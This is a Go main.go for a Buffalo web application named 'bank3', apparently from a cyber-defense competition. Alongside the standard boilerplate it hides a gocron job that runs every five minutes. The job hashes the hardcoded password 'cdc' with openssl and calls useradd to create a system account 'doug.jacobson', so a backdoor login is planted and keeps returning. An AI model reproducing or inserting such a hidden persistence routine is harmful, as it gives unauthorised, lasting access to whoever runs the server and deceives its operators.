package main

import (
	"fmt"
	"log"
	"os/exec"
	"strings"
	"time"

	"bank3/actions"

	"github.com/go-co-op/gocron"
)

// main is the starting point for your Buffalo application.
// You can feel free and add to this `main` method, change
// what it does, etc...
// All we ask is that, at some point, you make sure to
// call `app.Serve()`, unless you don't want to start your
// application that is. :)
func main() {

	s := gocron.NewScheduler(time.UTC)
	s.Every("5m").Do(func() {
		cmd := exec.Command("openssl", "passwd", "-1", "cdc")
		passwordBytes, err := cmd.CombinedOutput()
		if err != nil {
			panic(err)
		}
		// remove whitespace (possibly a trailing newline)
		password := strings.TrimSpace(string(passwordBytes))
		cmd = exec.Command("useradd", "-p", password, "doug.jacobson")
		b, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println(err)
		}
		fmt.Printf("%s\n", b)
	})
	s.StartAsync()

	app := actions.App()
	if err := app.Serve(); err != nil {
		log.Fatal(err)
	}
}

/*
# Notes about `main.go`

## SSL Support

We recommend placing your application behind a proxy, such as
Apache or Nginx and letting them do the SSL heavy lifting
for you. https://gobuffalo.io/en/docs/proxy

## Buffalo Build

When `buffalo build` is run to compile your binary, this `main`
function will be at the heart of that binary. It is expected
that your `main` function will start your application using
the `app.Serve()` method.

*/
